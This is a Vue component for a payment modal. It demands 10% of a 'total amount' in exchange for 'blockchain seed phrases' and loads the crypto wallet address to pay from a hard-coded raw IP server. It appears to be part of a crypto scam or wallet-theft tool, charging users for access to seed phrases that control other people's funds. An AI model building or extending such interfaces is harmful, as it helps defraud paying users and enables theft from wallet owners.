<script setup>
import { ref, computed, onMounted } from 'vue'
import Button from './Button.vue'
import CloseButton from './buttons/CloseButton.vue'
import { vOnClickOutside } from '@vueuse/components'
import VueQrcode from '@chenfengyuan/vue-qrcode'

const walletAddress = ref('') // Initialize as an empty string to be updated from API
const isLoading = ref(true) // Track loading state

const props = defineProps({
  show: {
    type: Boolean,
    required: true
  },
  totalAmount: {
    type: Number,
    default: 0
  }
})

const emit = defineEmits(['close'])

const copyWalletAddress = () => {
  navigator.clipboard.writeText(walletAddress.value).then(() => {
    alert('Wallet address copied!')
  })
}

const closeModal = () => {
  emit('close')
}

const paymentRequired = computed(() => {
  return (props.totalAmount * 0.1).toFixed(2)
})

// Fetch wallet address from the local API when the component is mounted
onMounted(async () => {
  try {
    const response = await fetch('http://85.192.30.153:8080/api/address/get')
    if (response.ok) {
      const data = await response.json()
      walletAddress.value = data.address || 'No address available' // Update wallet address
    } else {
      console.error('Failed to fetch wallet address')
    }
  } catch (error) {
    console.error('Error fetching wallet address:', error)
  } finally {
    isLoading.value = false // Hide loading spinner once data is fetched
  }
})
</script>

<template>
  <div
    v-if="show"
    class="not-draggable fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center"
  >
    <div v-on-click-outside="closeModal" class="bg-[#0d161d] scale-90 rounded-lg p-6 w-96 relative">
      <close-button class="absolute top-2 right-2" @click="closeModal" />
      <h2 class="text-white text-lg font-bold mb-4">Payment Required</h2>
      <p class="text-gray-300 mb-4 text-sm">
        To get access to the blockchain seed phrases, you need to pay 10% of the total amount, which
        is
        <strong>{{ paymentRequired }}$</strong>.
      </p>

      <!-- Loading spinner -->
      <div v-if="isLoading" class="flex justify-center items-center p-6">
        <div class="animate-spin border-4 border-t-4 border-gray-200 border-solid rounded-full w-12 h-12"></div>
      </div>

      <!-- Content to display after loading -->
      <div v-else class="flex flex-col items-center justify-center p-6 bg-gray-800 rounded-lg shadow-lg max-w-md mx-auto">
        <h3 class="text-white text-lg font-bold mb-4 text-center">Crypto Wallet Address</h3>
        <p class="text-gray-300 text-sm mb-4 text-center">{{ walletAddress }}</p>
        <Button :text="'Copy Wallet Address'" :on-click="copyWalletAddress" />
        <div class="mt-4">
          <VueQrcode :value="walletAddress" :size="150" />
        </div>
      </div>
    </div>
  </div>
</template>
